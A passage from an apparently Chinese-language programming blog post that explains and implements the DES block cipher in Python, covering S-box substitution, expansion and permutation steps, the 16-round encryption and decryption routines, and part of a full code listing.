class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>], [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">14</span>], [<span class="number">11</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">3</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">9</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>], [<span class="number">10</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>, <span class="number">6</span>], [<span class="number">4</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">4</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">1</span>], [<span class="number">13</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">12</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">1</span>, <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">2</span>], [<span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">12</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">13</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">7</span>], [<span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>, <span class="number">2</span>],</span><br><span class="line">        [<span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">8</span>], [<span class="number">2</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">11</span>]</span><br><span class="line">    ]]</span><br><span class="line"></span><br><span class="line">    m = [m[i:i + <span class="number">6</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">6</span>)]</span><br><span class="line">    res = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        p = m[i]</span><br><span class="line">        z = <span class="built_in">int</span>(<span class="built_in">str</span>(p[<span class="number">0</span>]) + <span class="built_in">str</span>(p[<span class="number">5</span>]), <span class="number">2</span>)</span><br><span class="line">        h = <span class="built_in">int</span>(<span class="built_in">str</span>(p[<span class="number">1</span>]) + <span class="built_in">str</span>(p[<span class="number">2</span>]) + <span class="built_in">str</span>(p[<span class="number">3</span>]) + <span class="built_in">str</span>(p[<span class="number">4</span>]), <span class="number">2</span>)</span><br><span class="line">        r = s[i][z][h]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">bin</span>(r)[<span class="number">2</span>:].zfill(<span class="number">4</span>):</span><br><span class="line">            res.append(<span class="built_in">int</span>(j))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Expand</span>(<span class="params">m</span>):</span><br><span class="line">    e = [<span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">24</span>, <span class="number">25</span>,</span><br><span class="line">         <span class="number">24</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> e]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">P</span>(<span class="params">m</span>):</span><br><span class="line">    p = [<span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>,</span><br><span class="line">         <span class="number">1</span>, <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>, <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">         <span class="number">2</span>, <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>, <span class="number">9</span>,</span><br><span class="line">         <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>, <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">25</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> p]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cipher_function</span>(<span class="params">m, sub_key</span>):</span><br><span class="line">    t = xor(Expand(m), sub_key)</span><br><span class="line">    t = S(t)</span><br><span class="line">    t = P(t)</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">go_round</span>(<span class="params">l, r, sub_key</span>):</span><br><span class="line">    <span class="keyword">return</span> r, xor(l, cipher_function(r, sub_key))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    sub_keys = key_generate(key)</span><br><span class="line">    l, r = IP(plain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    <span class="keyword">return</span> FP(r + l)</span><br></pre></td></tr></table></figure>
<p>在获取子秘钥后，先将明文经<strong>IP</strong>置换，同秘钥置换中的第一步一样，拆封成左右两半。</p>
<p>然后经过十六轮的运算【主要是看<strong>cipher_function</strong>函数。</p>
<p>在<strong>cipher_function</strong>函数中，先将半段长为<strong>32</strong>位的明文拓展为<strong>48</strong>位，然后同子秘钥异或。</p>
<p>接下来每<strong>6</strong>位为一组，分<strong>8</strong>组，对应<strong>8</strong>组<strong>S</strong>盒，取<strong>6</strong>位中的<strong>0</strong>和<strong>5</strong>为纵坐标，<strong>1</strong>到<strong>4</strong>位横坐标，取数。</p>
<p>比如第一组是<strong>110100</strong>的时候，取下标<strong>0</strong>和<strong>5</strong>，是<strong>10</strong>，第<strong>2</strong>行，取下标<strong>1</strong>到<strong>4</strong>，是<strong>1010</strong>，第<strong>10</strong>列，取数为<strong>9</strong>，转二进制是<strong>1001</strong>。</p>
<p>这样便把<strong>48</strong>位混淆后的密文转为<strong>32</strong>位了。</p>
<p>然后再将其经<strong>P</strong>置换。</p>
<p>如此十六轮运算后将得到的左右密文拼接，再经<strong>FP</strong>置换，得到最终结果。</p>
<h5 id="解密过程">解密过程</h5>
<p>数据解密的算法与加密算法相同，区别在于扩展后同子秘钥进行按位异或的密钥的使用顺序不同，即解密时将生成的<strong>16</strong>组子秘钥逆序使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">plain, key</span>):</span><br><span class="line">    sub_keys = key_generate(key)[::-<span class="number">1</span>]</span><br><span class="line">    l, r = IP(plain)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        l, r = go_round(l, r, sub_keys[i])</span><br><span class="line">    <span class="keyword">return</span> FP(r + l)</span><br></pre></td></tr></table></figure>
<h5 id="完整代码">完整代码</h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 数值转2进制数组位数扩展</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">int2bin</span>(<span class="params">m, n</span>):</span><br><span class="line">    m = <span class="built_in">bin</span>(m)[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">if</span> n &gt;= <span class="built_in">len</span>(m):</span><br><span class="line">        m = m.zfill(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        m = m[<span class="built_in">len</span>(m) - n:]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        res.append(<span class="built_in">int</span>(i))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2进制数组转数值</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2int</span>(<span class="params">a</span>):</span><br><span class="line">    s = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">        s += <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(s, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 异或</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> [x ^ y <span class="keyword">for</span> x, y <span class="keyword">in</span> <span class="built_in">zip</span>(a, b)]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 左移</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">left_rotate</span>(<span class="params">res, offset</span>):</span><br><span class="line">    <span class="keyword">return</span> res[offset:] + res[:offset]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PC1盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC1</span>(<span class="params">key</span>):</span><br><span class="line">    pc1 = [<span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>,</span><br><span class="line">           <span class="number">10</span>, <span class="number">2</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>,</span><br><span class="line">           <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>,</span><br><span class="line">           <span class="number">14</span>, <span class="number">6</span>, <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>]</span><br><span class="line">    k1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> pc1:</span><br><span class="line">        k1.append(key[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> k1[<span class="number">0</span>:<span class="number">28</span>], k1[<span class="number">28</span>:<span class="number">56</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># PC2盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PC2</span>(<span class="params">key</span>):</span><br><span class="line">    pc2 = [<span class="number">14</span>, <span class="number">17</span>, <span class="number">11</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">15</span>, <span class="number">6</span>, <span class="number">21</span>, <span class="number">10</span>,</span><br><span class="line">           <span class="number">23</span>, <span class="number">19</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">26</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">7</span>, <span class="number">27</span>, <span class="number">20</span>, <span class="number">13</span>, <span class="number">2</span>,</span><br><span class="line">           <span class="number">41</span>, <span class="number">52</span>, <span class="number">31</span>, <span class="number">37</span>, <span class="number">47</span>, <span class="number">55</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">51</span>, <span class="number">45</span>, <span class="number">33</span>, <span class="number">48</span>,</span><br><span class="line">           <span class="number">44</span>, <span class="number">49</span>, <span class="number">39</span>, <span class="number">56</span>, <span class="number">34</span>, <span class="number">53</span>, <span class="number">46</span>, <span class="number">42</span>, <span class="number">50</span>, <span class="number">36</span>, <span class="number">29</span>, <span class="number">32</span>]</span><br><span class="line">    <span class="keyword">return</span> [key[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> pc2]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 秘钥生成</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_generate</span>(<span class="params">key</span>):</span><br><span class="line">    l, r = PC1(key)</span><br><span class="line">    offset = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">2</span>, <span class="number">1</span>]</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> offset:</span><br><span class="line">        l = left_rotate(l, i)</span><br><span class="line">        r = left_rotate(r, i)</span><br><span class="line">        res.append(PC2(l + r))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># IP盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">IP</span>(<span class="params">message</span>):</span><br><span class="line">    ip = [<span class="number">58</span>, <span class="number">50</span>, <span class="number">42</span>, <span class="number">34</span>, <span class="number">26</span>, <span class="number">18</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">60</span>, <span class="number">52</span>, <span class="number">44</span>, <span class="number">36</span>, <span class="number">28</span>, <span class="number">20</span>, <span class="number">12</span>, <span class="number">4</span>,</span><br><span class="line">          <span class="number">62</span>, <span class="number">54</span>, <span class="number">46</span>, <span class="number">38</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">64</span>, <span class="number">56</span>, <span class="number">48</span>, <span class="number">40</span>, <span class="number">32</span>, <span class="number">24</span>, <span class="number">16</span>, <span class="number">8</span>,</span><br><span class="line">          <span class="number">57</span>, <span class="number">49</span>, <span class="number">41</span>, <span class="number">33</span>, <span class="number">25</span>, <span class="number">17</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">59</span>, <span class="number">51</span>, <span class="number">43</span>, <span class="number">35</span>, <span class="number">27</span>, <span class="number">19</span>, <span class="number">11</span>, <span class="number">3</span>,</span><br><span class="line">          <span class="number">61</span>, <span class="number">53</span>, <span class="number">45</span>, <span class="number">37</span>, <span class="number">29</span>, <span class="number">21</span>, <span class="number">13</span>, <span class="number">5</span>, <span class="number">63</span>, <span class="number">55</span>, <span class="number">47</span>, <span class="number">39</span>, <span class="number">31</span>, <span class="number">23</span>, <span class="number">15</span>, <span class="number">7</span>]</span><br><span class="line">    m1 = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ip:</span><br><span class="line">        m1.append(message[i - <span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> m1[<span class="number">0</span>:<span class="number">32</span>], m1[<span class="number">32</span>:<span class="number">64</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># FP盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FP</span>(<span class="params">m</span>):</span><br><span class="line">    fp = [<span class="number">40</span>, <span class="number">8</span>, <span class="number">48</span>, <span class="number">16</span>, <span class="number">56</span>, <span class="number">24</span>, <span class="number">64</span>, <span class="number">32</span>, <span class="number">39</span>, <span class="number">7</span>, <span class="number">47</span>, <span class="number">15</span>, <span class="number">55</span>, <span class="number">23</span>, <span class="number">63</span>, <span class="number">31</span>,</span><br><span class="line">          <span class="number">38</span>, <span class="number">6</span>, <span class="number">46</span>, <span class="number">14</span>, <span class="number">54</span>, <span class="number">22</span>, <span class="number">62</span>, <span class="number">30</span>, <span class="number">37</span>, <span class="number">5</span>, <span class="number">45</span>, <span class="number">13</span>, <span class="number">53</span>, <span class="number">21</span>, <span class="number">61</span>, <span class="number">29</span>,</span><br><span class="line">          <span class="number">36</span>, <span class="number">4</span>, <span class="number">44</span>, <span class="number">12</span>, <span class="number">52</span>, <span class="number">20</span>, <span class="number">60</span>, <span class="number">28</span>, <span class="number">35</span>, <span class="number">3</span>, <span class="number">43</span>, <span class="number">11</span>, <span class="number">51</span>, <span class="number">19</span>, <span class="number">59</span>, <span class="number">27</span>,</span><br><span class="line">          <span class="number">34</span>, <span class="number">2</span>, <span class="number">42</span>, <span class="number">10</span>, <span class="number">50</span>, <span class="number">18</span>, <span class="number">58</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">41</span>, <span class="number">9</span>, <span class="number">49</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">25</span>]</span><br><span class="line">    <span class="keyword">return</span> [m[i - <span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> fp]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># S盒置换</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">S</span>(<span class="params">m</span>):</span><br><span class="line">    s = [[</span><br><span class="line">        [<span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">7</span>], [<span class="number">0</span>, <span class="number">15</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">14</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">9</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">1</span>, <span class="number">14</span>, <span class="number">8</span>, <span class="number">13</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">3</span>, <span class="number">10</span>, <span class="number">5</span>, <span class="number">0</span>], [<span class="number">15</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">13</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">15</span>, <span class="number">1</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">11</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">10</span>], [<span class="number">3</span>, <span class="number">13</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">11</span>, <span class="number">5</span>],</span><br><span class="line">        [<span class="number">0</span>, <span class="number">14</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">15</span>], [<span class="number">13</span>, <span class="number">8</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">9</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">10</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">14</span>, <span class="number">6</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">8</span>], [<span class="number">13</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">1</span>],</span><br><span class="line">        [<span class="number">13</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">15</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">7</span>], [<span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">12</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">7</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">15</span>], [<span class="number">13</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>, <span class="number">9</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">14</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">4</span>], [<span class="number">3</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">13</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">7</span>, <span class="number">2</span>, <span class="number">14</span>]</span><br><span class="line">    ], [</span><br><span class="line">        [<span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">6</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">9</span>], [<span class="number">14</span>, <span class="number">11</span>, <span class="number">2</span>, <span class="number">12</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">13</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">3</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">6</span>],</span><br><span class="line">        [<span class="number">4</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">7</span>, <span 